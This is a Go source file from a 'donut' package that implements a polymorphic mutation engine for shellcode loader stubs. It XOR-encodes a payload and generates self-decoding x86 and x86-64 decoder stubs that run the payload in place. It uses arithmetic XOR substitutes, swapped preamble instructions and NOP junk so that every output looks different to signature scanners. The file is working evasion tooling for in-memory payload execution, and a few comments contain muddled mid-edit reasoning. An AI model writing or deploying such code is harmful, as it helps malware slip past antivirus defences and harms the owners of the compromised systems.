package donut

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
)

/*
	Polymorphic Mutation Engine for Donut loader stubs.

	Applies intended semantic-preserving transformations with randomized byte
	diversity by combining three techniques. Independent invocations may
	occasionally produce the same bytes:

	1. Arithmetic XOR encoding — the loader payload is XOR-encoded with a random
	   single-byte key, and the decoder stub uses arithmetic equivalents instead
	   of a direct XOR instruction:
	     A ^ B  ≡  (A & ~B) | (~A & B)     [AND-NOT-OR form]
	     A ^ B  ≡  (A | B) & (~A | ~B)     [OR-NAND form]
	     A ^ B  ≡  (A + B) - 2*(A & B)     [ADD-SUB form]

	2. Preamble instruction substitution — fixed preamble bytes are replaced with
	   semantically equivalent alternatives (e.g. xor eax,eax ↔ sub eax,eax).

	3. Junk/NOP insertion — NOP-equivalent instruction sequences inserted around
	   the decoder stub for structural diversity.
*/

// randNonZeroByte returns a uniformly distributed random byte in [1, 255].
func randNonZeroByte() (byte, error) {
	value, err := randIntn(255)
	if err != nil {
		return 0, err
	}
	return byte(value + 1), nil
}

// randIntn returns a random int in [0, n).
func randIntn(n int) (int, error) {
	if n <= 0 {
		return 0, fmt.Errorf("morph: invalid random bound %d", n)
	}
	if n == 1 {
		return 0, nil
	}

	// Rejection sampling avoids modulo bias. A bounded retry count keeps a
	// broken but non-error reader from turning loader generation into a hang.
	const maxAttempts = 128
	bound := uint64(n)
	threshold := -bound % bound
	var raw [8]byte
	for attempt := 0; attempt < maxAttempts; attempt++ {
		if _, err := io.ReadFull(rand.Reader, raw[:]); err != nil {
			return 0, fmt.Errorf("morph: random integer: %w", err)
		}
		value := binary.LittleEndian.Uint64(raw[:])
		if value < threshold {
			continue
		}
		return int(value % bound), nil
	}
	return 0, fmt.Errorf("morph: random integer: source rejected %d samples", maxAttempts)
}

// ---------- NOP-equivalent instruction tables ----------

// nopEquivalents contains x86/x64 instruction sequences that have no
// architectural side effects. Only Intel-defined multi-byte NOPs (0F 1F)
// and the canonical 0x90 NOP are used — these are true NOPs in both
// 32-bit and 64-bit modes.
//
// IMPORTANT: Self-XCHG instructions like `xchg eax,eax` (87 C0) are
// NOT included because in x86-64 long mode, 32-bit register writes
// zero-extend the upper 32 bits, silently corrupting 64-bit values
// (e.g., xchg ecx,ecx would zero the upper half of RCX, destroying
// the instance pointer the loader depends on).
var nopEquivalents = [][]byte{
	{0x90},                                     // NOP
	{0x66, 0x90},                               // 66 NOP
	{0x0F, 0x1F, 0x00},                         // NOP dword ptr [eax]
	{0x0F, 0x1F, 0x40, 0x00},                   // NOP dword ptr [eax+0]
	{0x0F, 0x1F, 0x44, 0x00, 0x00},             // NOP dword ptr [eax+eax*1+0]
	{0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00},       // NOP word  ptr [eax+eax*1+0]
	{0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00}, // NOP dword ptr [eax+0x0]
}

// insertJunk prepends 2–12 bytes of random NOP-equivalent instruction sequences
// before the supplied code. The returned slice starts with junk NOPs followed
// by the original code bytes (unmodified).
func insertJunk(code []byte) ([]byte, error) {
	// Pick a random junk budget between 2 and 12 bytes.
	budgetOffset, err := randIntn(11)
	if err != nil {
		return nil, err
	}
	budget := 2 + budgetOffset

	var junk []byte
	for len(junk) < budget {
		remaining := budget - len(junk)
		candidates := make([][]byte, 0, len(nopEquivalents))
		for _, nop := range nopEquivalents {
			if len(nop) <= remaining {
				candidates = append(candidates, nop)
			}
		}
		nopIndex, err := randIntn(len(candidates))
		if err != nil {
			return nil, err
		}
		nop := candidates[nopIndex]
		junk = append(junk, nop...)
	}

	out := make([]byte, 0, len(junk)+len(code))
	out = append(out, junk...)
	out = append(out, code...)
	return out, nil
}

// ---------- Preamble substitution ----------

// morphPreamble returns a semantically equivalent preamble for the given
// architecture, randomly choosing among instruction variants.
//
// X32: pop edx; push ecx; push edx  (3 bytes, no variants)
// X64: the x64 wrapper is 22 bytes
// X84: xor eax,eax  replaced with sub eax,eax or and eax,0
func morphPreamble(arch DonutArch) ([]byte, error) {
	switch arch {
	case X32:
		// pop edx(0x5A); push ecx(0x51); push edx(0x52)
		// No semantic alternatives that are shorter, but we can insert
		// NOP junk around the fixed instructions.
		base := []byte{0x5A, 0x51, 0x52}
		return base, nil

	case X64:
		// The x64 wrapper preamble is the 22-byte stack-alignment stub.
		// We return the canonical bytes; caller wraps with junk if needed.
		return append([]byte(nil), LOADER_EXE_X64[:22]...), nil

	case X84:
		// The x84 mode-switch preamble starts with zeroing EAX.
		// Three equivalent ways to zero a 32-bit register:
		//   xor eax, eax  →  31 C0  (2 bytes, clears flags)
		//   sub eax, eax  →  29 C0  (2 bytes, clears flags)
		//   and eax, 0    →  83 E0 00 (3 bytes, clears flags)
		variants := [][]byte{
			{0x31, 0xC0},       // xor eax, eax
			{0x29, 0xC0},       // sub eax, eax
			{0x83, 0xE0, 0x00}, // and eax, 0
		}
		variant, err := randIntn(len(variants))
		if err != nil {
			return nil, err
		}
		return variants[variant], nil

	default:
		return nil, fmt.Errorf("morph: unsupported architecture %d", arch)
	}
}

// ---------- Arithmetic XOR Encoder ----------

// xorEncodeForm represents an arithmetic identity for A ^ B.
type xorEncodeForm int

const (
	// formANDNOTOR: A ^ B = (A & ~B) | (~A & B)
	formANDNOTOR xorEncodeForm = iota
	// formORNAND: A ^ B = (A | B) & (~A | ~B)  =  (A|B) & ~(A&B)
	formORNAND
	// formADDSUB: A ^ B = (A + B) - 2*(A & B)
	formADDSUB
)

// arithmeticXOREncode encodes the payload with a random non-zero single-byte
// XOR key. Instead of emitting a direct XOR instruction in the decoder stub,
// it uses an arithmetic equivalent randomly chosen per invocation.
//
// Returns:
//   - stub:    position-independent x86-64 decoder machine code
//   - encoded: the XOR-encoded payload (same length as input)
//   - key:     the single-byte XOR key used
//   - err:     non-nil on failure
//
// The decoder stub is designed so that concatenating stub + encoded forms
// a self-decoding, position-independent code block: the stub decodes the
// payload in-place and falls through to execute it.
func arithmeticXOREncode(payload []byte) (stub []byte, encoded []byte, key byte, err error) {
	if len(payload) == 0 {
		return nil, nil, 0, fmt.Errorf("morph: empty payload")
	}
	if len(payload) > 0x00FFFFFF {
		return nil, nil, 0, fmt.Errorf("morph: payload too large (%d bytes)", len(payload))
	}

	key, err = randNonZeroByte()
	if err != nil {
		return nil, nil, 0, err
	}

	// Encode payload
	encoded = make([]byte, len(payload))
	for i, b := range payload {
		encoded[i] = b ^ key
	}

	// Pick a random arithmetic form for the decoder
	formIndex, err := randIntn(3)
	if err != nil {
		return nil, nil, 0, err
	}
	form := xorEncodeForm(formIndex)

	// Build the decoder stub
	stub = buildDecoderStub64(key, uint32(len(payload)), form)
	return
}

// buildDecoderStub64 generates a position-independent x86-64 decoder stub.
//
// Algorithm:
//  1. Get RIP (via LEA RIP-relative) to locate the encoded payload
//  2. Set up loop counter = payloadLen
//  3. For each byte: load, apply arithmetic XOR equivalent with key, store
//  4. Fall through to decoded payload
//
// Register allocation (avoids RAX/RCX/RDX/RBX/RSP/RBP which the loader needs):
//
//	R8  = pointer to current byte in payload
//	R9  = loop counter (bytes remaining)
//	R10 = scratch for arithmetic operations
//	R11 = scratch for arithmetic operations
func buildDecoderStub64(key byte, payloadLen uint32, form xorEncodeForm) []byte {
	var buf bytes.Buffer

	// --- LEA R8, [RIP + <offset>] ---
	// The offset will be patched after we know the stub length.
	// For now, emit the instruction with a placeholder offset.
	// 4C 8D 05 xx xx xx xx  =  lea r8, [rip + xx xx xx xx]
	leaPos := buf.Len()
	buf.Write([]byte{0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00}) // 7 bytes

	// --- MOV R9D, payloadLen ---
	// 41 B9 xx xx xx xx  =  mov r9d, imm32
	buf.Write([]byte{0x41, 0xB9})
	binary.Write(&buf, binary.LittleEndian, payloadLen) // 6 bytes

	// --- Loop label (loopStart) ---
	loopStart := buf.Len()

	// --- TEST R9D, R9D ---
	// 45 85 C9  =  test r9d, r9d
	buf.Write([]byte{0x45, 0x85, 0xC9}) // 3 bytes

	// --- JE done (forward jump, patch later) ---
	// 74 xx  =  je rel8
	jePos := buf.Len()
	buf.Write([]byte{0x74, 0x00}) // 2 bytes, placeholder

	// --- MOVZX R10D, byte [R8] ---
	// 45 0F B6 10  =  movzx r10d, byte ptr [r8]
	buf.Write([]byte{0x45, 0x0F, 0xB6, 0x10}) // 4 bytes

	// --- Apply arithmetic XOR equivalent ---
	// R10 = current byte value (A)
	// key = B (immediate)
	// Result goes back to R10B
	writeArithmeticXOR(&buf, key, form)

	// --- MOV byte [R8], R10B ---
	// 45 88 10  =  mov byte ptr [r8], r10b
	buf.Write([]byte{0x45, 0x88, 0x10}) // 3 bytes

	// --- INC R8 ---
	// 49 FF C0  =  inc r8
	buf.Write([]byte{0x49, 0xFF, 0xC0}) // 3 bytes

	// --- DEC R9D ---
	// 41 FF C9  =  dec r9d
	buf.Write([]byte{0x41, 0xFF, 0xC9}) // 3 bytes

	// --- JMP loopStart ---
	// EB xx  =  jmp rel8
	jmpTarget := loopStart - (buf.Len() + 2) // relative offset (negative)
	buf.Write([]byte{0xEB, byte(int8(jmpTarget))})

	// --- done label ---
	donePos := buf.Len()

	// Patch JE offset: distance from end of JE instruction to donePos
	stubBytes := buf.Bytes()
	stubBytes[jePos+1] = byte(donePos - (jePos + 2))

	// Patch LEA offset: RIP at end of LEA points to next instruction,
	// encoded payload starts right after the entire stub.
	stubLen := len(stubBytes)
	leaOffset := int32(stubLen - (leaPos + 7)) // from end of LEA to end of stub
	binary.LittleEndian.PutUint32(stubBytes[leaPos+3:leaPos+7], uint32(leaOffset))

	return stubBytes
}

// writeArithmeticXOR emits x86-64 instructions that compute R10B = R10B ^ key
// using the specified arithmetic form. Uses R11 as scratch.
func writeArithmeticXOR(buf *bytes.Buffer, key byte, form xorEncodeForm) {
	switch form {
	case formANDNOTOR:
		// A ^ B = (A & ~B) | (~A & B)
		//
		// MOV R11B, R10B       ; R11 = A (copy)
		// NOT R10B             ; R10 = ~A
		// AND R10B, key        ; R10 = ~A & B
		// NOT R11B             ; R11 = ~A... wait, we need ~B
		// Let me redo:
		// R10 = A
		// We need: (A & ~B) | (~A & B)
		//
		// MOV R11B, R10B       ; R11 = A
		// AND R11B, ~key       ; R11 = A & ~B
		// NOT R10B             ; R10 = ~A
		// AND R10B, key        ; R10 = ~A & B
		// OR  R10B, R11B       ; R10 = (A & ~B) | (~A & B) = A ^ B

		// 45 88 D3  =  mov r11b, r10b
		buf.Write([]byte{0x45, 0x88, 0xD3})
		// 41 80 E3 xx  =  and r11b, imm8 (~key)
		buf.Write([]byte{0x41, 0x80, 0xE3, ^key})
		// 41 F6 D2  =  not r10b
		buf.Write([]byte{0x41, 0xF6, 0xD2})
		// 41 80 E2 xx  =  and r10b, imm8 (key)
		buf.Write([]byte{0x41, 0x80, 0xE2, key})
		// 45 08 DA  =  or r10b, r11b
		buf.Write([]byte{0x45, 0x08, 0xDA})

	case formORNAND:
		// A ^ B = (A | B) & ~(A & B) = (A | B) & (~A | ~B)
		//
		// MOV R11B, R10B       ; R11 = A
		// OR  R11B, key        ; R11 = A | B
		// AND R10B, key        ; R10 = A & B
		// NOT R10B             ; R10 = ~(A & B)
		// AND R10B, R11B       ; R10 = (A | B) & ~(A & B) = A ^ B

		// 45 88 D3  =  mov r11b, r10b
		buf.Write([]byte{0x45, 0x88, 0xD3})
		// 41 80 CB xx  =  or r11b, imm8
		buf.Write([]byte{0x41, 0x80, 0xCB, key})
		// 41 80 E2 xx  =  and r10b, imm8
		buf.Write([]byte{0x41, 0x80, 0xE2, key})
		// 41 F6 D2  =  not r10b
		buf.Write([]byte{0x41, 0xF6, 0xD2})
		// 45 20 DA  =  and r10b, r11b
		buf.Write([]byte{0x45, 0x20, 0xDA})

	case formADDSUB:
		// A ^ B = (A + B) - 2*(A & B)
		//
		// MOV R11B, R10B       ; R11 = A
		// AND R11B, key        ; R11 = A & B
		// ADD R11B, R11B       ; R11 = 2*(A & B)
		// ADD R10B, key        ; R10 = A + B
		// SUB R10B, R11B       ; R10 = (A + B) - 2*(A & B) = A ^ B

		// 45 88 D3  =  mov r11b, r10b
		buf.Write([]byte{0x45, 0x88, 0xD3})
		// 41 80 E3 xx  =  and r11b, imm8
		buf.Write([]byte{0x41, 0x80, 0xE3, key})
		// 45 00 DB  =  add r11b, r11b
		buf.Write([]byte{0x45, 0x00, 0xDB})
		// 41 80 C2 xx  =  add r10b, imm8
		buf.Write([]byte{0x41, 0x80, 0xC2, key})
		// 45 28 DA  =  sub r10b, r11b
		buf.Write([]byte{0x45, 0x28, 0xDA})
	}
}

// encodeLoader is the integration point used by Sandwich(). It wraps
// arithmeticXOREncode and returns (encodedPayload, decoderStub).
// When isX64 is false, a 32-bit position-independent decoder stub is
// generated instead of the default x86-64 stub.
func encodeLoader(loader []byte, isX64 bool) (encoded []byte, decoder []byte, err error) {
	if isX64 {
		stub, enc, _, err := arithmeticXOREncode(loader)
		if err != nil {
			return nil, nil, fmt.Errorf("morph: encode x64 loader: %w", err)
		}
		return enc, stub, nil
	}
	// 32-bit path
	stub, enc, _, err := arithmeticXOREncode32(loader)
	if err != nil {
		return nil, nil, fmt.Errorf("morph: encode x86 loader: %w", err)
	}
	return enc, stub, nil
}

// arithmeticXOREncode32 is the 32-bit equivalent of arithmeticXOREncode.
// It generates a position-independent x86 (32-bit) decoder stub using
// CALL/POP for EIP-relative addressing and registers ESI/ECX/EAX.
//
// The stub saves EAX, ECX, ESI on the stack (balanced push/pop), so ESP
// returns to its entry value and the caller's stack layout is preserved.
func arithmeticXOREncode32(payload []byte) (stub []byte, encoded []byte, key byte, err error) {
	if len(payload) == 0 {
		return nil, nil, 0, fmt.Errorf("morph: empty payload")
	}
	if len(payload) > 0x00FFFFFF {
		return nil, nil, 0, fmt.Errorf("morph: payload too large (%d bytes)", len(payload))
	}

	key, err = randNonZeroByte()
	if err != nil {
		return nil, nil, 0, err
	}

	encoded = make([]byte, len(payload))
	for i, b := range payload {
		encoded[i] = b ^ key
	}

	formIndex, err := randIntn(3)
	if err != nil {
		return nil, nil, 0, err
	}
	form := xorEncodeForm(formIndex)
	stub = buildDecoderStub32(key, uint32(len(payload)), form)
	return
}

// buildDecoderStub32 generates a position-independent x86 (32-bit) decoder.
//
// Layout:
//
//	PUSH EAX           ; save scratch registers
//	PUSH ECX
//	PUSH ESI
//	CALL $+5           ; push EIP onto stack
//	POP ESI            ; ESI = address of this POP
//	ADD ESI, <offset>  ; ESI -> start of encoded payload
//	MOV ECX, <len>     ; loop counter
//	.loop:
//	  TEST ECX, ECX
//	  JZ .done
//	  MOVZX EAX, byte [ESI]
//	  <arithmetic XOR with key>
//	  MOV [ESI], AL
//	  INC ESI
//	  DEC ECX
//	  JMP .loop
//	.done:
//	POP ESI            ; restore registers
//	POP ECX
//	POP EAX
//	; fall through to decoded payload
func buildDecoderStub32(key byte, payloadLen uint32, form xorEncodeForm) []byte {
	var buf bytes.Buffer

	// PUSH EAX, ECX, ESI — save registers we'll clobber
	buf.WriteByte(0x50) // push eax
	buf.WriteByte(0x51) // push ecx
	buf.WriteByte(0x56) // push esi

	// CALL $+5 — pushes address of next instruction
	// E8 00 00 00 00
	buf.Write([]byte{0xE8, 0x00, 0x00, 0x00, 0x00})

	// POP ESI — ESI = address of this instruction
	buf.WriteByte(0x5E) // pop esi

	// ADD ESI, <offset> — the offset from POP ESI to end of stub
	// We'll patch this after we know the stub length.
	// 81 C6 xx xx xx xx  =  add esi, imm32
	addPos := buf.Len()
	buf.Write([]byte{0x81, 0xC6, 0x00, 0x00, 0x00, 0x00})

	// MOV ECX, payloadLen
	// B9 xx xx xx xx
	buf.WriteByte(0xB9)
	binary.Write(&buf, binary.LittleEndian, payloadLen)

	// --- Loop label ---
	loopStart := buf.Len()

	// TEST ECX, ECX
	// 85 C9
	buf.Write([]byte{0x85, 0xC9})

	// JZ done (patch later)
	// 74 xx
	jePos := buf.Len()
	buf.Write([]byte{0x74, 0x00})

	// MOVZX EAX, byte [ESI]
	// 0F B6 06
	buf.Write([]byte{0x0F, 0xB6, 0x06})

	// --- Arithmetic XOR on AL ---
	writeArithmeticXOR32(&buf, key, form)

	// MOV [ESI], AL
	// 88 06
	buf.Write([]byte{0x88, 0x06})

	// INC ESI
	// 46
	buf.WriteByte(0x46)

	// DEC ECX
	// 49
	buf.WriteByte(0x49)

	// JMP loopStart
	// EB xx
	jmpTarget := loopStart - (buf.Len() + 2)
	buf.Write([]byte{0xEB, byte(int8(jmpTarget))})

	// --- done label ---
	donePos := buf.Len()

	// POP ESI, ECX, EAX — restore in reverse order
	buf.WriteByte(0x5E) // pop esi
	buf.WriteByte(0x59) // pop ecx
	buf.WriteByte(0x58) // pop eax

	// Patch JZ offset
	stubBytes := buf.Bytes()
	stubBytes[jePos+1] = byte(donePos - (jePos + 2))

	// Patch ADD ESI offset: distance from the POP ESI to end of stub
	// POP ESI is at addPos - 1 (the 0x5E byte). The value in ESI after
	// POP is the address of the POP instruction itself.
	// We need ESI to point past the end of the stub (where encoded payload starts).
	// offset = stubLen - (addPos - 1)
	//        = stubLen - popEsiAddr
	// But POP ESI sets ESI to the address of the CALL's return point, which is
	// the address of POP ESI itself. Then ADD ESI, offset should make ESI point
	// to the byte after the last stub instruction.
	// The POP ESI is at byte index (addPos - 1) relative to stub start.
	// We want ESI + offset = stubLen (relative to stub start).
	// offset = stubLen - (addPos - 1) ... wait, ESI holds an absolute address.
	// Let's say stub starts at address BASE.
	// POP ESI → ESI = BASE + (addPos - 1)  [the address of the POP itself = CALL return addr]
	// Wait, CALL pushes the address of the instruction AFTER the CALL (= address of POP ESI).
	// So ESI = &(POP ESI instruction) = BASE + (addPos - 1)
	// We want ESI after ADD = BASE + stubLen (start of encoded payload)
	// offset = BASE + stubLen - (BASE + addPos - 1) = stubLen - addPos + 1
	stubLen := len(stubBytes)
	addOffset := int32(stubLen - addPos + 1)
	// But we need to account for the fact that ADD ESI is at addPos and is 6 bytes.
	// Actually: POP ESI is at index (addPos - 1). ESI = address of POP ESI.
	// After that, ADD ESI, imm32 adds to ESI.
	// We want ESI = stubStart + stubLen = address past the stub.
	// ESI_initial = stubStart + (addPos - 1)
	// ESI_final = stubStart + stubLen
	// imm32 = ESI_final - ESI_initial = stubLen - (addPos - 1) = stubLen - addPos + 1
	binary.LittleEndian.PutUint32(stubBytes[addPos+2:addPos+6], uint32(addOffset))

	return stubBytes
}

// writeArithmeticXOR32 emits 32-bit x86 instructions for AL = AL ^ key.
// Uses AH as scratch (within EAX).
func writeArithmeticXOR32(buf *bytes.Buffer, key byte, form xorEncodeForm) {
	switch form {
	case formANDNOTOR:
		// AL ^ key = (AL & ~key) | (~AL & key)
		// MOV AH, AL       ; AH = A (copy)
		// AND AH, ~key     ; AH = A & ~B
		// NOT AL            ; AL = ~A
		// AND AL, key       ; AL = ~A & B
		// OR  AL, AH        ; AL = (A & ~B) | (~A & B)

		// 88 C4  =  mov ah, al
		buf.Write([]byte{0x88, 0xC4})
		// 80 E4 xx  =  and ah, imm8
		buf.Write([]byte{0x80, 0xE4, ^key})
		// F6 D0  =  not al
		buf.Write([]byte{0xF6, 0xD0})
		// 24 xx  =  and al, imm8
		buf.Write([]byte{0x24, key})
		// 08 E0  =  or al, ah
		buf.Write([]byte{0x08, 0xE0})

	case formORNAND:
		// AL ^ key = (AL | key) & ~(AL & key)
		// MOV AH, AL       ; AH = A
		// OR  AH, key      ; AH = A | B
		// AND AL, key      ; AL = A & B
		// NOT AL            ; AL = ~(A & B)
		// AND AL, AH        ; AL = (A|B) & ~(A&B)

		// 88 C4  =  mov ah, al
		buf.Write([]byte{0x88, 0xC4})
		// 80 CC xx  =  or ah, imm8
		buf.Write([]byte{0x80, 0xCC, key})
		// 24 xx  =  and al, imm8
		buf.Write([]byte{0x24, key})
		// F6 D0  =  not al
		buf.Write([]byte{0xF6, 0xD0})
		// 20 E0  =  and al, ah
		buf.Write([]byte{0x20, 0xE0})

	case formADDSUB:
		// AL ^ key = (AL + key) - 2*(AL & key)
		// MOV AH, AL       ; AH = A
		// AND AH, key      ; AH = A & B
		// ADD AH, AH       ; AH = 2*(A & B)
		// ADD AL, key      ; AL = A + B
		// SUB AL, AH        ; AL = (A+B) - 2*(A&B)

		// 88 C4  =  mov ah, al
		buf.Write([]byte{0x88, 0xC4})
		// 80 E4 xx  =  and ah, imm8
		buf.Write([]byte{0x80, 0xE4, key})
		// 00 E4  =  add ah, ah
		buf.Write([]byte{0x00, 0xE4})
		// 04 xx  =  add al, imm8
		buf.Write([]byte{0x04, key})
		// 28 E0  =  sub al, ah
		buf.Write([]byte{0x28, 0xE0})
	}
}
